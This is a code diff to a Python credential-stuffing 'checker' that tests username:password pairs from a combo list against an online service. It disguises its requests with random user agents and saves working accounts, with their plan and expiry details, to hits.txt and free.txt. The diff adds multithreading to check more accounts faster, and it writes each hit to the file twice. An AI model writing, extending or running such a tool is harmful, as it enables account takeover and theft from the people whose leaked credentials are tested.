@@ -1,3 +1,4 @@
+import threading
 from fake_useragent import UserAgent
 import requests
 import json
@@ -14,6 +15,14 @@ def update_status():
     global HITS, BADs, FREE, EXPIRED
     print(f"\033[32mHITS: {HITS}, \033[31mBADs: {BADs}, \033[36mFREE: {FREE}, \033[33mEXPIRED: {EXPIRED}\033[0m")
 
+def append_to_hits_file(username, password, plan, expiry1, days_left):
+    data = f"{username}:{password}, Plan: {plan}, Expiry Date: {expiry1}, Days Left: {days_left},\n"
+    with open('hits.txt', 'a+') as hits_file:
+        hits_file.write(data)
+def append_to_free_file(username, password):
+    data = f"{username}:{password}\n"
+    with open('free.txt', 'a+') as hits_file:
+        hits_file.write(data)
 def combinations_generator(path):
     with open(path, 'r') as file:
         for line in file:
@@ -71,12 +80,14 @@ def checker(username, password):
                 typeresult = "HIT"
                 hit = open("hits.txt", "a+")
                 hit.write(f"{username}:{password}, Plan: {plan}, Expiry Date: {expiry1}, Days Left: {days_left},\n")
+                append_to_hits_file(username, password, plan, expiry1, days_left)
             else:
                 EXPIRED += 1
                 typeresult = "Expired"
         else:
             FREE += 1
             typeresult = "Free"
+            append_to_free_file(username, password)
     elif response.status_code == 404:
         BADs += 1
         typeresult="BAD"
@@ -103,11 +114,24 @@ print("\033[31mFirst Add Your Combo In combo.txt\n")
 c=input("\033[36m\nDo you want to continue? (Y/n):- \033[0m")
 if c == "Y" or c == "y":
     combo_file = "combo.txt"
-    for email, password in combinations_generator(combo_file):
+    combo_list = list(combinations_generator(combo_file))
+    num_threads = int(input("Enter no. of threads: "))
+    def check_combo(email, password):
         print(f"Checking: {email}")
         checker(email, password)
         print("------------------------------------")
         update_status()
         print("------------------------------------")
+
+    threads = []
+
+    for i in range(min(num_threads, len(combo_list))):
+        email, password = combo_list.pop()
+        thread = threading.Thread(target=check_combo, args=(email, password))
+        threads.append(thread)
+        thread.start()
+
+    for thread in threads:
+        thread.join()
 else:
     SystemExit
